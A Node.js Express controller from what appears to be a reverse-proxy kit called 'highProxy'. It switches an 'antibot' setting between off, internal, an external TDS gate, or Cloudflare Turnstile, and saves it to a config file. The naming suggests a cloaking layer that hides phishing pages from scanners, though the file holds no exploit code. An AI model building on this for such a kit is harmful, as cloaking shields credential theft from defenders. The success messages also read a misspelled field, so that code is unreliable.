const fs = require('fs')
const { exec } = require('child_process')

const { validationResult } = require('express-validator');
const superagent = require('superagent');
const { info } = require('console');

const cfw = require('./cfw')

const util = require('../../lib/utils');


exports.changeGuard = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const antibotType = req.body.antibotType;

    const antibotSwitch = req.body.antibot
    

    const userFileObj = JSON.parse(util.betterReadFile('./highProxy/config/user.json'))

    if (antibotType === 'OFF') {
        userFileObj.ANTIBOT = 'OFF'

    }
    if (antibotType === 'INTERNAL') {
        userFileObj.ANTIBOT = 'INTERNAL'

    } else if (antibotType === 'EXTERNAL'){
        userFileObj.ANTIBOT = 'EXTERNAL'

        const antibotInfo = req.body.antibotInfo
        const hcaptchaData  = req.body.hcaptchaData

        const antibotInfoList = antibotInfo.split(';')


        userFileObj.TDS_URL = antibotInfoList[0]
        userFileObj.GATE_KEY = antibotInfoList[1]
        userFileObj.HCAPTCHA_DATA = hcaptchaData
    } else if (antibotType === 'TURNSTILE') {

        return turnstileGuard(req, res, userFileObj)
        
    }


    util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully changed antibot to ${userFileObj.ANITBOT}`,
        info: antibotSwitch,
    })
}


const turnstileGuard = (req, res, userFileObj) => {

    const cfData = req.body.cfData
    const cfDataList = cfData.split(':')

    const cfEmail = cfDataList[0]
    const cfKey = cfDataList[1]


    cfw.getTurnstileForDomain(cfEmail, cfKey, (err, siteData) => {
        if (err) {
            return res.json({
                status: "Error",
                error: "Failed To Set Turnstil for Domain",
                code: -100,
                needRestart: false,
                message: `Failed To Set Turnstile for inbuiltRedirect, is your Account Valid? ${err}`                })
        }

        console.log(JSON.stringify(siteData))

        userFileObj.TURNSTILE_DATA = `${siteData.siteKey};${siteData.secret}`
        userFileObj.ANTIBOT = 'TURNSTILE'

        util.betterWriteFile('./highProxy/config/user.json', JSON.stringify(userFileObj, '', 4))

        return res.json({
            status: "Success",
            error: null,
            code: 0,
            message: `Successfully changed antibot to ${userFileObj.ANITBOT}`,
            info: 'TURNSTILE',
        })
    })
    
}